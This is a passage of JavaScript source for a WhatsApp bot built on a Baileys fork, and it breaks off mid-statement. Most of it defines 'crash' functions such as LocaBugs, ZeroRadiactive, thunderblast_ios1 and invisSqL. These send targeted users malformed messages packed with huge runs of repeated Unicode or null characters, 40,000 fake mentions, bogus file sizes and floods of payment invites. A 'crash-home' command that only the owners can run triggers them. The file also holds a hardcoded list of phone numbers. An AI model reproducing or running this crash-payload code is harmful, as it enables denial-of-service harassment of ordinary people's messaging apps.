require("./config")
const { normalizeMessageContent,generateMessageIDV2, generateMessageID, WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("baron-baileys-v2")
const FormData = require('form-data')
const fs = require('fs')
const moment = require('moment-timezone');
const pino = require('pino')
const logger = pino({ level: 'debug' });

module.exports = async (conn, m, chatUpdate) => {
try {
const from = m.key.remoteJid
const info = m
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id:(m.mtype === 'conversation') ? m.message.conversation :(m.mtype === 'deviceSentMessage') ? m.message.extendedTextMessage.text :(m.mtype == 'imageMessage') ? m.message.imageMessage.caption :(m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./lib/myfunc')
var budy = (typeof m.text == 'string' ? m.text: '')
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = args.join(" ")
const q = args.join(" ")
const sender = m.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await conn.decodeJid(conn.user.id)
const senderNumber = sender.split('@')[0]
const userList = [
"5512981791389@s.whatsapp.net",
"556791420945@s.whatsapp.net",
"5599935009504@s.whatsapp.net",
"4917397773777@s.whatsapp.net",
"5512981966384@s.whatsapp.net",
"5555935051878@s.whatsapp.net",
"5575935058172@s.whatsapp.net",
"559991791193@s.whatsapp.net",
"593969533280@s.whatsapp.net",
"5512981692700@s.whatsapp.net",
"5512988551376@s.whatsapp.net",
"553498650959@s.whatsapp.net",
"5512981689931@s.whatsapp.net",
"5512997675520@s.whatsapp.net",
"5512981785061@s.whatsapp.net",
"556137704636@s.whatsapp.net",
"5511954801380@s.whatsapp.net",
"5512987002704@s.whatsapp.net",
"120363372993100706@newsletter",
"5521997837889@s.whatsapp.net"
];
const joinedArgs = args.join(' ');
const targetNumber = joinedArgs.replace(/[^\d]/g, '');
const isCreator = userList.includes(sender);
const pushname = m.pushName || `${senderNumber}`
const isBot = m.key.fromMe ? true : false
const os = require('os')
const time = hora = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
const data = date = dataa = moment.tz('America/Sao_Paulo').format('DD/MM/YY');

const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const groupMetadata = m.isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const PrecisaSerMembro = m.isGroup ? await participants.filter(v => v.admin === null).map(v => v.id) : [];
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')
const pickRandom = (arr) => {return arr[Math.floor(Math.random() * arr.length)]}
const dispositivo = '' + (m.key.id.length > 21 ? 'Android' : m.key.id.substring(0, 2) == '3A' ? 'IOS' : 'WhatsApp web');
const numeroFormatado = q.replace(/[^\d]/g, '');
const numi = numeroFormatado + '@s.whatsapp.net'
const enviarVideoButton = async (id, link, captionText, idbutton, displayButton) => {await conn.sendMessage(id, {video: { url: link},caption: captionText,buttons: [{buttonId: idbutton,buttonText: { displayText: displayButton },type: 1,}],headerType: 1,viewOnce: true,})};
const enviariMageButton = async (id, link, captionText, idbutton, displayButton) => {await conn.sendMessage(id, {image: { url: link},caption: captionText,buttons: [{buttonId: idbutton,buttonText: { displayText: displayButton },type: 1,}],headerType: 1,viewOnce: true,})};
const enviarTextButton = async (id, texto, footertexto, idbutton, displayButton) => {await conn.sendMessage(id, {text: texto,footer: footertexto,buttons: [{buttonId: idbutton,buttonText: { displayText: displayButton },type: 1,}],headerType: 1,viewOnce: true,});};
const enviar = (texto) => {conn.sendMessage(from, { text: texto})}
const reply = (texto) => {conn.sendMessage(from, { text: texto})}

const RESET = '\x1b[0m';
const GREEN = '\x1b[32m';
const BLUE = '\x1b[34m';
const RED = '\x1b[31m';
const YELLOW = '\x1b[33m';
const CYAN = '\x1b[36m';
const WHITE = '\x1b[37m';

if (m.message) {
console.log(`
╭─────────────────────────────────
│
│〔 ${RED}PRIVADO${RESET} 〕: ${WHITE}${from}${RESET}
│
│〔 ${RED}DE${RESET} 〕: ${YELLOW}${sender}${RESET}
│〔 ${RED}MENSAGEM${RESET} 〕: ${GREEN}${body.length > 90 ? "" : body}${RESET}
│〔 ${RED}NiCK${RESET} 〕: ${GREEN}${pushname}${RESET}
│〔 ${RED}TYPE${RESET} 〕: ${GREEN}${m.mtype}${RESET}
│〔 ${RED}DiSPOSiTiVO${RESET} 〕: ${GREEN}${dispositivo}${RESET}
╰─────────────────────────────────`) 
}

const bytesToSize = (bytes) => {const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];if (bytes === 0) return '0 Byte';const i = parseInt(Math.floor(Math.log(bytes) / Math.log(1024)), 10);return `${Math.round(bytes / Math.pow(1024, i), 2)} ${sizes[i]}`;};
const used = process.memoryUsage();
const cpus = os.cpus().map(cpu => {cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0);return cpu;});
const cpu = cpus.reduce((last, cpu, _, {length}) => {last.total += cpu.total;last.speed += cpu.speed / length;last.times.user += cpu.times.user;last.times.nice += cpu.times.nice;last.times.sys += cpu.times.sys;last.times.idle += cpu.times.idle;last.times.irq += cpu.times.irq; return last;}, {speed: 0,total: 0,times: {user: 0,nice: 0,sys: 0,idle: 0,irq: 0}});
const timestamp = new Date().getTime();
const latencia = timestamp - new Date().getTime();
const neww = Date.now();
const oldd = Date.now();
function timefunction(seconds) {seconds = Number(seconds);var d = Math.floor(seconds / (3600 * 24));var h = Math.floor(seconds % (3600 * 24) / 3600);var m = Math.floor(seconds % 3600 / 60);var s = Math.floor(seconds % 60);var dDisplay = d > 0 ? d + (d == 1 ? " Dia, " : " Dias, ") : "00 dias, ";var hDisplay = h > 0 ? h + (h == 1 ? " Hora, " : " Horas, ") : "00 horas, ";var mDisplay = m > 0 ? m + (m == 1 ? " Minuto, " : " Minutos, ") : "00 minutos, ";var sDisplay = s > 0 ? s + (s == 1 ? " Segundo" : " Segundos") : "00 segundos";return `${dDisplay}${hDisplay}${mDisplay}${sDisplay}`;}
const uptimeSeconds = Math.floor(process.uptime());
const uptimeFormatted = timefunction(uptimeSeconds);
const iphost = await fetchJson(`https://api.ipify.org/?format=json`)
const web = fs.readFileSync('./src/opa.webp');
const chatId = m.chat;
const uwu = 'ꦿꦶꦷꦸꦹꦽ'.repeat(500);
const sekzo3 = 'ྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃ'.repeat(600);
const axios = require('axios');
const delay = ms => new Promise(res => setTimeout(res, ms));
const crypto = require('crypto');
messageSecret: crypto.randomBytes(32)

//++++++++Funcion 1++++++++++\\
async function LocaBugs(target) {
 await conn.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `☠️ • 𝐂𝐫𝐚𝐬𝐡 𝐔𝐢? 𝐤𝐤𝐤𝐤𝐣𝐜`+'ꦿꦶꦷꦸꦹꦽ'.repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "✨️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } });
}
//++++++++++++Funcion 2+++++++++++++\\
async function ZeroRadiactive(target) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "✨️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛" + "ោ៝".repeat(10000),
        title: "✨️ • 𝐊𝐚𝐭𝐡 𝐂𝐫𝐚𝐬𝐡",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/17606956_686071860479481_2023913755657097039_n.enc?ccb=11-4&oh=01_Q5Aa1QG9-CRTR3xBq-Vz4QoJnMZRKop5NHKdAB9xc-rN1ds8cg&oe=683FA8F9&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "Y7jQDWDPfQSIEJ34j3BFn6Ad4NLuBer0W3UTHwqvpc8=",
    fileLength: "5945180",
    seconds: 17,
    mediaKey: "4s+R9ADOCB3EUsrVDE6XbKWrUNv31GRuR/bo2z8U3DU=",
    height: 1280,
    width: 720,
    fileEncSha256: "hG/yZfURm4ryYYa0JUnHdNautOMsYGoFKDGd5/4OGLQ=",
    directPath: "/v/t62.7161-24/17606956_686071860479481_2023913755657097039_n.enc?ccb=11-4&oh=01_Q5Aa1QG9-CRTR3xBq-Vz4QoJnMZRKop5NHKdAB9xc-rN1ds8cg&oe=683FA8F9&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1746415507",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "✨️ • 𝐊𝐚𝐭𝐡 𝐂𝐫𝐚𝐬𝐡"
        },
        streamingSidecar: "Rtr68xZ6G4TzcRHjr2QpMxn4BDOY3u/wOhpZ7qJj+Cg8o5+aXkCfIr2XfjcFmaQk/CgQLAOyAU6D5mHVhXkKxHpzrhZ2koMZVQLsRHAd5KwxayVXt+6eSl8ZnzpxdFhQ+HTByMt4tpTA39l6zU/jpCdDR/qzd/0Rs3qqwCuswd5ZiUf1c0CB9GwQUmc+yFFux6mspHm/gUe+TkftR2ZiKtf3Y5j9RmHHt9IuFX1KVj9jNj20ZfOJptjEYhgDwfDBIdr3/ddRQNaAlRyp2wTh8XEKUynBSbONgnjPIkj8JEl0OsFJqMeTwQyub9HsM/vRa6o8av0NHBn37ZO8Nag05Dpdvon0swsdnXDtomN6q4x+ls2RfnSeEAvRFGsgiG8H8naybUUY0uhYDpPBYHvuH/9fRwDOD9SPITongjimPplk0GOOmfeAamC9EbhDs/c8/5XL40AUbvshQDLIG3l0oTV4ta6zy/VdAclglFmhfVqeedilMk+lG29lpfIbag1nFu+qPZLIieXYQJ418DtASPmFtbsNYkvprPx7xF9ZtyoIa6gZ+v/4qCigvshtRf5n9msopfNJjyPLIrMAoq1475aB4j3puzXwkNm5NSVIahkuX1HWPnApe5lgOzymvJj3N/n0JCg/+PIYv4Jm6z0ZInZRxt3hrvXObchfVIkVuSKqd5U8WIjoOf+FI+CrvdaZBnb+2KH8A1GkskhNTL3DO+Sv1qYRlBFsk21So8abrZlqspnfVMF7DSoJen6s8GowXbrrJZPvwDnhhzL4IKjY0mrUzxnwTeCycU6OstR/ZKMkbg7OUA3+g+pM1k6eLdN53mkMKCt13WwvXndvmW/ekTMqOYc/rjoFQovbTPhcAMTX/kLegR3meuhxBvNE8xXyYvrI6lIIeGpNNsV32O03Li99BwF7hG7OxydsX0/OsYqJnPAUqvUdb1L9dTafihVeZPdokMN4VjqohFhgZiPsaNQScWDL/kAokANUdQ5QgEy6cn5/stxZMb0H7+grn3jHyBX7TfCnA7xjnyLJ4EEn1GN1NwapIyCP2+wwO4ewVHtkcEN88tzj5XIpYTASomq3ITa0iuZiparFg4Th3OGGKNCF4dwOnwARxsAhQisJUFr7mZq6qS6rTAvXWBkIDjr/3+FSvbG5RJJzMl9a1NN9tj4+epOQqkSKzjWbhv0f6fI1FTlJOpKkfsE5HIdWDg==",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const stickerMessage = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
            contextInfo: {
                mentionedJid: mentionedList
            }
        }
    };

    const msg1 = generateWAMessageFromContent(target, {
        viewOnceMessage: { message: { videoMessage } }
    }, {});

    const msg2 = generateWAMessageFromContent(target, {
        viewOnceMessage: { message: stickerMessage }
    }, {});

    await conn.relayMessage("status@broadcast", msg1.message, {
        messageId: msg1.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    await conn.relayMessage("status@broadcast", msg2.message, {
        messageId: msg2.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    if (isCreator) {
        await conn.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg1.key,
                        type: 25
                    }
                }
            }
        }, { participant: { jid: target } });
    }
}
//++++++++++++Funcion 3+++++++++++++\\
async function thunderblast_ios1(target) {
    const TravaIphone = "𑇂𑆵𑆴𑆿".repeat(60000);
    const genMsg = (fileName, bodyText) => generateWAMessageFromContent(target, proto.Message.fromObject({
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/json",
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999999",
                            pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: fileName,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1715880173"
                        },
                        hasMediaAttachment: true
                    },
                    body: { text: bodyText },
                    nativeFlowMessage: {
                        messageParamsJson: `{"name":"galaxy_message","flow_action":"navigate","flow_action_payload":{"screen":"CTZ_SCREEN"},"flow_cta":"🎗","flow_id":"UNDEFINEDONTOP","flow_message_version":"9.903","flow_token":"UNDEFINEDONTOP"}`
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINEDONTOP" }]
                    }
                }
            }
        }
    }), { userJid: target });

    const msg1 = await genMsg(`${TravaIphone}️`, "𑇂𑆵𑆴𑆿".repeat(1000));
    await conn.relayMessage(target, msg1.message, { participant: { jid: target }, messageId: msg1.key.id });

    const msg2 = await genMsg("UNDEFINEDONTOP", "\u0000" + "ꦾ".repeat(150000) + "@1".repeat(250000));
    await conn.relayMessage(target, msg2.message, { participant: { jid: target }, messageId: msg2.key.id });

    await conn.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: TravaIphone,
            url: "https://youtube.com/@p.a.zinwebkkkkj"
        }
    }, { participant: { jid: target } });

await conn.relayMessage(target, {
        'extendedTextMessage': {
            'text': TravaIphone,
            'contextInfo': {
                'stanzaId': target,
                'participant': target,
                'quotedMessage': {
                    'conversation': '🍏 • 𝐍𝐨 𝐭𝐫𝐚𝐯𝐚 𝐢𝐏𝐡𝐨𝐧𝐞 𝟏𝟓? 𝐤𝐤𝐤𝐤𝐣𝐜' + 'ꦾ'.repeat(50000)
                },
                'disappearingMode': {
                    'initiator': "CHANGED_IN_CHAT",
                    'trigger': "CHAT_SETTING"
                }
            },
            'inviteLinkGroupTypeV2': "DEFAULT"
        }
    }, {
        'participant': {
            'jid': target
        }
    }, {
        'messageId': null
    });

    const paymentMsg = service => ({
    paymentInviteMessage: {
        serviceType: service,
        expiryTimestamp: Date.now() + 91814400000,
        maxTransactionAmount: 10000000000,
        maxDailyTransaction: 100000000000,
        maxTransactionFrequency: 1,
        secureMode: true,
        verificationRequired: true,
        antiFraudProtection: true,
        multiFactorAuthentication: true,
        transactionLogging: true,
        geoLock: true,
        sessionTimeout: 300000,
        blacklistIPs: ["192.168.0.1", "192.168.0.2"],
        whitelistIPs: ["192.168.1.1", "192.168.1.2"],
        transactionRateLimit: 3,
        realTimeFraudDetection: true,
        dailyLimitResetTime: "00:00",
        fullAuditTrail: true,
        userBehaviorAnalysis: true,
        transactionNotification: true,
        dynamicSessionTokens: true,
        deviceFingerprinting: true,
        transactionEncryption: true,
        encryptedMsgID: generateEncryptedID(service)
    }
});

function generateEncryptedID(service) {
    return `ENC_${Buffer.from(service + Date.now()).toString('base64')}`;
}

for (const service of ["FBPAY", "UPI", "PAYPAL", "WPPAY", "GPAY", "PP", "APPLEPAY", "VENMO", "CASHAPP", "STRIPE", "BRAINTREE", "SAMSUNGPAY", "ALIPAY", "WECHATPAY", "MPAY", "AIPAY", "BIOPAY", "NFTPAY", "VOICEPAY", "BLOCKPAY", "QPAY", "NPAY", "ZPAY", "TLOCK", "HOLO"]) {
    await conn.relayMessage(target, paymentMsg(service), {
        participant: { jid: target },
        timestamp: Date.now(),
        requestID: generateEncryptedID(service),
    });
}
    
    await conn.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: "🍏 𝐏.𝐀. 𝐙𝐢𝐧 𝐢𝐎𝐒" + TravaIphone,
            url: "https://youtube.com/@p.a.zinwebkkkkj"
        }
    }, { participant: { jid: target } });
    
    await conn.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: "🍏 • 𝐊𝐚𝐭𝐡 𝐂𝐫𝐚𝐬𝐡" + TravaIphone,
            url: "https://youtube.com/@p.a.zinwebkkkkj"
        }
    }, { participant: { jid: target } });
}
//++
quotedtext = {
            key: {
                remoteJid: "status@broadcast",
                fromMe: false,
                participant: `0@s.whatsapp.net`,

                id: "3EB0"
            },
            message: {
                extendedTextMessage: {
                    text: `✨️ • 𝐊𝐚𝐭𝐡 𝐂𝐫𝐚𝐬𝐡`,
                    contextInfo: {
                        stanzaId: "3EB0",
                    }
                }
            }
        };
//++++++++++++Funcion 4+++++++++++++\\
async function sendOfferVideoCall(isTarget, ptcp = true) {
  try {
    await conn.offerCall(isTarget, { 
      video: true 
    });
    console.log(`Exitoso ✅️`);
  } catch (error) {
    console.error(`error en:`, error);
  }
}
//++++++++++++Funcion 5+++++++++++++\\
async function sendOfferCall(isTarget, ptcp = true) {

    try {

        await conn.offerCall(isTarget);

        console.log(`Exitoso ✅️`);

    } catch (error) {

        console.error(`error`, error);

    }

}
//++++++++++++Funcion 6+++++++++++++\\
const zetas = {
  key: {
    fromMe: false,
    remoteJid: "status@broadcast",
    participant: "0@s.whatsapp.net"
  },
  message: {
    contactMessage: {
      displayName: "⿻𝐙𝐄𝐓𝐀𝐒 ϟ 𝐕𝟒⿻",
      vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:ZETAS COLLAB\nTEL;type=CELL;type=VOICE;waid=593994924071:593994924071\nEND:VCARD`
    }
  }
}
//++++++++++++Funcion 7+++++++++++++\\
const n = {
  key: {
    fromMe: false,
    stanzaId: "ABCDEF123456",
    remoteJid: "status@broadcast",
    participant: "0@s.whatsapp.net"
  },
  message: {
    extendedTextMessage: {
      text: '⿻𝐙𝐄𝐓𝐀𝐒 ϟ 𝐕𝟒⿻'
    }
  }
}
//++++++++++++Funcion 8+++++++++++++\\
async function stikerNotif(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "StikerMsg",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(7000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(1000000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(7000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(7000),
                },
                
              ],
            },
          },
        },
      },
    };

    await conn.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}
async function invisSqL(isTarget) {
  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];

  const msg = generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          header: {
            title: "𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘 ",
            hasMediaAttachment: false,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
              fileLength: "11887",
              height: 1080,
              width: 1080,
              mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
              fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1750124469",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
              contextInfo: {
                mentionedJid: [isTarget],
                participant: isTarget,
                remoteJid: isTarget,
                expiration: 9741,
                ephemeralSettingTimestamp: 9741,
                entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp",
                entryPointConversionDelaySeconds: 9742,
                disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
                }
              },
              scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
              scanLengths: [2071, 6199, 1634, 1983],
              midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
            }
          },
          body: {
            text: "𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘"
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000)
          }
        }
      }
    }
  }, {});

  await conn.relayMessage(isTarget, msg.message, {
    participant: { jid: isTarget },
    additionalNodes: Node,
    messageId: msg.key.id
  });
}

switch(command) {
case "crash-home":{
if (!isBot && !isCreator) return 
let pelaku = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')
let target = pelaku + "@s.whatsapp.net"
let doneios = `
   🎠𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘
⿻ Tarjeta : @${target.split('@')[0]}
⿻ Tipo : Crash Home Android Invisible 📱
⿻ Estado : Exitoso ✅️
`
   try {
    conn.sendMessage(from, {
        image: { url: './src/catalogo.jpg' },
        caption: doneios,
        footer: "</> Porfavor espera 10 minutos para evitar la suspensión",
        buttons: [
            {
                buttonId: "#", 
                buttonText: { displayText: '-#' },
                type: 1
            }
        ],
        contextInfo: {
        externalAdReply: {
            title: "𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘𝐛",
            body: "Crash Invisible Android", 
            thumbnail: fs.readFileSync ('./src/opa.webp'),
